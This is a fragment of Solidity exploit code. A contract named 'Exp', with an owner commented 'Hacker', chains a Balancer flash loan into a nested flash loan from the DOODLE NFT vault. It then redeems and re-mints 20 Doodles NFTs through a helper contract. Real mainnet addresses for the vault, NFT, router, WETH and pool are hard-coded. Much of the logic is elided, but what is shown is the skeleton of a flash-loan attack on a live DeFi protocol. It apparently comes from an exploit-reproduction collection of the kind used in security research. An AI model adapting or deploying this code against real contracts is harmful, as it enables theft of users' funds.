...
import "./interfaces/IDOODLE.sol";
import "./interfaces/IDoodles.sol";
...
contract Exp {
    ...
    IVault private immutable balancer;

    IDOODLE private immutable doodle;

    IDoodles private immutable doodles;
    ...
    constructor(IVault _balancer, IDOODLE _doodle, IDoodles _doodles, IUniswapV2Router02 _router, IWETH _weth, IPool _pool) {
        owner = msg.sender;       // Hacker
        balancer = _balancer;   // 0xBA12222222228d8Ba445958a75a0704d566BF2C8 // Flash Loan
        doodle = _doodle;       // 0x2F131C4DAd4Be81683ABb966b4DE05a549144443 // Vault
        doodles = _doodles;     // 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e // NFT
        router = _router;       // 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F // Router
        WETH = _weth;           // 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 // WETH
        pool = _pool;           // 0xEBe72CDafEbc1abF26517dd64b28762DF77912a9 // Pool
    }
    ...
    function receiveFlashLoan(
        ...
        doodle.flashLoan(address(this), address(doodle), 20 ether, "");
    }
    ...
    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        ...
        doodle.redeem(20, _specificIds);

        require(doodles.balanceOf(address(this)) >= 20, "redeem error.");

        Lib lib = new Lib(doodles, WETH);
        ...
        require(doodle.mint(_specificIds, _amount) == 20, "Error Amounts.");
...
contract Lib {
    ...
    constructor(IDoodles _doodles, IWETH _WETH) {
        exp = msg.sender;
        doodles = _doodles;
        WETH = _WETH;
        pool = IPool(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
        doodle = IDOODLE(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    }
